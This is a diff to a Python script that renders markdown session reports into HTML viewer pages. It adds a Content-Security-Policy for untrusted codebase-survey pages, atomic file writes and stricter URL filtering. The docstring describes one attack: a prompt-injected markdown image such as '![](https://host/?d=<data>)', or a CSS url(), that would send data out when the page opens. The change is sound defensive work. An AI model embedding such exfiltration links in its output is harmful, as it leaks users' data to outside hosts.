@@ -20,9 +20,21 @@ Rendering stays client-side (marked parses the same `.md` the page carries) so
 the markdown file remains the single source of truth: it is greppable, diffable
 and re-renderable, and the HTML is a disposable view of it.
 
+`--block-remote` is for pages written from untrusted sources (codebase-survey).
+It adds a Content-Security-Policy whose fetch directives refuse anything but
+local files, so a prompt-injected `![](https://host/?d=<data>)` -- or a CSS
+url() inside a mermaid diagram, which is inserted after the scrub has run --
+cannot send data out the moment the page opens. It leaves scripts alone (no
+script-src, no default-src), so the libraries above still load from the CDN.
+It is opt-in because it also drops the remote images an ordinary README
+carries (badges), which doc-browser's previews should keep showing. A
+markdown named like a codebase-survey document gets it without the flag: the
+run that renders a survey is the one an injection may have steered.
+
 Usage:
     python3 ~/.claude/skills/session-report/render_report.py REPORT.md
     python3 ~/.claude/skills/session-report/render_report.py REPORT.md --no-open
+    python3 ~/.claude/skills/session-report/render_report.py SURVEY.md --block-remote
 """
 
 from __future__ import annotations
@@ -30,10 +42,12 @@ from __future__ import annotations
 import argparse
 import base64
 import html as html_mod
+import os
 import platform
 import re
 import subprocess
 import sys
+import tempfile
 from pathlib import Path
 
 # Pinned to majors: both are loaded from a local file, so a surprise breaking
@@ -58,6 +72,44 @@ CDN_ASSETS = {
 ASSETS_DIR = Path.home() / ".claude/assets"
 
 ASSET_FILENAMES = {"mermaid": "mermaid.min.js", "marked": "marked.min.js"}
+
+# codebase-survey's file names: <stamp>-survey-<name>.md. The same rule is in
+# session-dossier's dossier_scope.py (pinned equal by a test) and in
+# doc-browser's catalog.ts; change all three together.
+_SURVEY_MARKDOWN = re.compile(r"^\d{8}-\d{6}-survey-[0-9A-Za-z-]+\.md$")
+
+# Fetch directives only. default-src is deliberately absent: it is the
+# fallback for script-src, and setting it would stop the CDN libraries and the
+# inline script. Inline styles stay allowed because the page and mermaid's SVG
+# both use them; external stylesheets (a remote @import) do not.
+_BLOCK_REMOTE_CSP = "; ".join(
+    [
+        "img-src file: data:",
+        "font-src file: data:",
+        "style-src 'unsafe-inline' file:",
+        "media-src 'none'",
+        "connect-src 'none'",
+        "frame-src 'none'",
+        "object-src 'none'",
+        "worker-src 'none'",
+        "form-action 'none'",
+        "base-uri 'none'",
+        # Inline event handlers. The scrub removes on* attributes already, and
+        # neither this page nor mermaid (securityLevel strict) uses them.
+        "script-src-attr 'none'",
+    ]
+)
+# Directly after <meta charset>, ahead of every <style> and <script>: a meta
+# CSP only governs what is fetched after it is parsed. DNS prefetching is off
+# too, or the browser could resolve a link's host name before any click.
+# doc-browser recognises a blocked survey page by this exact head (its
+# hooks/paths.ts holds a copy, pinned by a test). `file:` places no limit on
+# the host, so a CSS url(//host/x) from a diagram still resolves to a file URL
+# on that host: harmless on macOS and Linux, a network share on Windows.
+_BLOCK_REMOTE_META = (
+    f'<meta http-equiv="Content-Security-Policy" content="{_BLOCK_REMOTE_CSP}">\n'
+    '<meta http-equiv="x-dns-prefetch-control" content="off">\n'
+)
 
 _FENCE_RE = re.compile(r"^\s*(`{3,}|~{3,})")
 # Up to 3 leading spaces, per CommonMark (and marked, which actually renders
@@ -122,23 +174,50 @@ def extract_title(markdown: str, fallback: str) -> str:
     return fallback
 
 
-def build_html(markdown: str, title: str, assets: dict[str, str]) -> str:
-    """Wrap `markdown` in the standalone viewer shell."""
+def build_html(
+    markdown: str,
+    title: str,
+    assets: dict[str, str],
+    base_dir: Path | None = None,
+    block_remote: bool = False,
+) -> str:
+    """Wrap `markdown` in the standalone viewer shell.
+
+    `base_dir`, when given, is the directory relative image and link paths in
+    the markdown are resolved against: a page written away from its markdown
+    (a preview in a cache directory) would otherwise lose them. Empty, the
+    page resolves them against its own location, as before.
+
+    `block_remote` adds the CSP that refuses loads from outside local files
+    (see the module docstring).
+    """
     payload = base64.b64encode(markdown.encode("utf-8")).decode("ascii")
+    # The filesystem root's URI already ends in "/"; every other one needs it.
+    base = ""
+    if base_dir is not None:
+        uri = base_dir.resolve().as_uri()
+        base = uri if uri.endswith("/") else f"{uri}/"
+    base_payload = base64.b64encode(base.encode("utf-8")).decode("ascii")
     # The title goes in LAST. It is the only substitution that carries user
     # text, and html.escape leaves underscores alone, so a heading that spells
     # `__MD_B64__` would otherwise be a live placeholder for the replaces that
     # follow it and end up holding the whole payload.
     return (
-        _TEMPLATE.replace("__MERMAID_SRC__", assets["mermaid"])
+        _TEMPLATE.replace("__CSP_META__", _BLOCK_REMOTE_META if block_remote else "")
+        .replace("__MERMAID_SRC__", assets["mermaid"])
         .replace("__MARKED_SRC__", assets["marked"])
         .replace("__MD_B64__", payload)
+        .replace("__BASE_B64__", base_payload)
         .replace("__TITLE__", html_mod.escape(title, quote=True))
     )
 
 
 def render(
-    md_path: Path, out_dir: Path | None = None, open_browser: bool = True
+    md_path: Path,
+    out_dir: Path | None = None,
+    open_browser: bool = True,
+    base_dir: Path | None = None,
+    block_remote: bool = False,
 ) -> Path:
     """Render `md_path` to HTML beside it (or into `out_dir`) and return the path."""
     # errors="replace": a stray byte in a hand-edited report must not turn into
@@ -151,12 +230,33 @@ def render(
         .replace("\r", "\n")
     )
     title = extract_title(markdown, md_path.stem)
-    html = build_html(markdown, title, resolve_assets())
+    # A survey gets the policy even when the run that renders it left the flag
+    # off: that run is the one an injection may have steered.
+    block_remote = block_remote or bool(_SURVEY_MARKDOWN.match(md_path.name))
+    html = build_html(
+        markdown, title, resolve_assets(), base_dir=base_dir, block_remote=block_remote
+    )
 
     target_dir = out_dir or md_path.parent
     target_dir.mkdir(parents=True, exist_ok=True)
     html_path = target_dir / f"{md_path.stem}.html"
-    html_path.write_text(html, encoding="utf-8")
+    # Write a temp file and rename it over the target: write_text would follow
+    # a symlink already sitting at html_path and overwrite whatever it points
+    # at; os.replace swaps the link itself for the new page.
+    fd, tmp_name = tempfile.mkstemp(dir=target_dir, prefix=".render-", suffix=".tmp")
+    tmp = Path(tmp_name)
+    try:
+        with os.fdopen(fd, "w", encoding="utf-8") as fh:
+            fh.write(html)
+        # mkstemp creates 0600; give the page the mode a plain write would
+        # have had under the caller's umask, no looser.
+        umask = os.umask(0)
+        os.umask(umask)
+        os.chmod(tmp, 0o666 & ~umask)
+        os.replace(tmp, html_path)
+    except BaseException:
+        tmp.unlink(missing_ok=True)
+        raise
 
     if open_browser:
         opener = "open" if platform.system() == "Darwin" else "xdg-open"
@@ -186,6 +286,19 @@ def main(argv: list[str] | None = None) -> int:
         action="store_false",
         help="write the page but do not open it",
     )
+    parser.add_argument(
+        "--base-dir",
+        type=Path,
+        default=None,
+        help="directory relative paths in the markdown resolve against "
+        "(default: the page's own location)",
+    )
+    parser.add_argument(
+        "--block-remote",
+        action="store_true",
+        help="refuse images, fonts, stylesheets and other loads from outside "
+        "local files (for pages written from untrusted sources)",
+    )
     args = parser.parse_args(argv)
 
     md_path = Path(args.markdown).expanduser()
@@ -193,17 +306,33 @@ def main(argv: list[str] | None = None) -> int:
         print(f"render_report: no such markdown file: {md_path}", file=sys.stderr)
         return 1
 
-    print(render(md_path, out_dir=args.out, open_browser=args.open_browser))
+    base_dir = args.base_dir.expanduser() if args.base_dir is not None else None
+    if base_dir is not None and not base_dir.is_dir():
+        print(f"render_report: no such directory: {base_dir}", file=sys.stderr)
+        return 1
+
+    print(
+        render(
+            md_path,
+            out_dir=args.out,
+            open_browser=args.open_browser,
+            base_dir=base_dir,
+            block_remote=args.block_remote,
+        )
+    )
     return 0
 
 
 # Raw: the embedded JS carries regex escapes (`\s`), which Python would
 # otherwise read as invalid string escapes and warn about at import time.
+# `__CSP_META__` sits at the start of the viewport line, with no newline of its
+# own (the meta it expands to brings one), so a page rendered without
+# --block-remote stays byte-for-byte what it was before the flag existed.
 _TEMPLATE = r"""<!doctype html>
 <html lang="ja">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+__CSP_META__<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>__TITLE__</title>
 <style>
   :root {
@@ -269,6 +398,10 @@ _TEMPLATE = r"""<!doctype html>
 (function () {
   // Base64 rather than inline text: report prose quotes closing script tags.
   const MD_B64 = "__MD_B64__";
+  // Where relative paths in the markdown point (render_report.py --base-dir);
+  // empty leaves them relative to this page, the default.
+  const BASE_B64 = "__BASE_B64__";
+  const BASE = new TextDecoder().decode(Uint8Array.from(atob(BASE_B64), (c) => c.charCodeAt(0)));
   const md = new TextDecoder().decode(Uint8Array.from(atob(MD_B64), (c) => c.charCodeAt(0)));
   const content = document.getElementById("content");
 
@@ -277,7 +410,20 @@ _TEMPLATE = r"""<!doctype html>
     el.className = "banner";
     el.textContent = message;
     document.getElementById("banner-slot").appendChild(el);
+    return el;
   }
+
+  // A --block-remote page refuses loads from outside local files. Say so,
+  // instead of leaving bare broken images. Registered before anything below
+  // inserts content, and kept for mermaid, which renders later.
+  let blockedCount = 0;
+  let blockedBanner = null;
+  document.addEventListener("securitypolicyviolation", function () {
+    blockedCount += 1;
+    const text = "外部からの読み込みを " + blockedCount + " 件止めました。";
+    if (blockedBanner === null) blockedBanner = warn(text);
+    else blockedBanner.textContent = text;
+  });
 
   // A missing library must degrade to readable source, never to a blank page.
   if (typeof window.marked === "undefined") {
@@ -314,8 +460,27 @@ _TEMPLATE = r"""<!doctype html>
   // scheme or none at all (a relative URL cannot execute).
   function isSafeUrl(value) {
     const v = String(value).replace(/[\u0000-\u0020]/g, "").toLowerCase();
+    // Two leading slashes, either way round, name a host: on a page opened
+    // from disk, `//host/x` becomes a file URL on that host -- a network share
+    // on Windows.
+    if (/^[\\/]{2}/.test(v)) return false;
     if (/^(https?:|mailto:|tel:)/.test(v)) return true;
     return !/^[a-z][a-z0-9+.-]*:/.test(v);
+  }
+
+  // Runs after isSafeUrl, on what it let through: a path with no scheme and no
+  // leading "#", "/" or "?" is re-based onto BASE. Anything with a scheme,
+  // a fragment or an absolute path is left exactly as the filter passed it.
+  function resolveRelative(value, base) {
+    const v = String(value);
+    if (!base || v === "" || /^[a-z][a-z0-9+.-]*:/i.test(v) || /^[#/?]/.test(v)) return v;
+    // An unparseable value is left as the filter passed it: throwing here
+    // would stop the script before the content is shown at all.
+    try {
+      return new URL(v, base).href;
+    } catch (_) {
+      return v;
+    }
   }
 
   const URL_ATTRS = /^(href|src|xlink:href|formaction|action|poster|data|background)$/;
@@ -332,6 +497,8 @@ _TEMPLATE = r"""<!doctype html>
         }
       } else if (URL_ATTRS.test(name) && !isSafeUrl(attr.value)) {
         el.removeAttribute(attr.name);
+      } else if (name === "src" || name === "href") {
+        attr.value = resolveRelative(attr.value, BASE);
       }
     });
   });
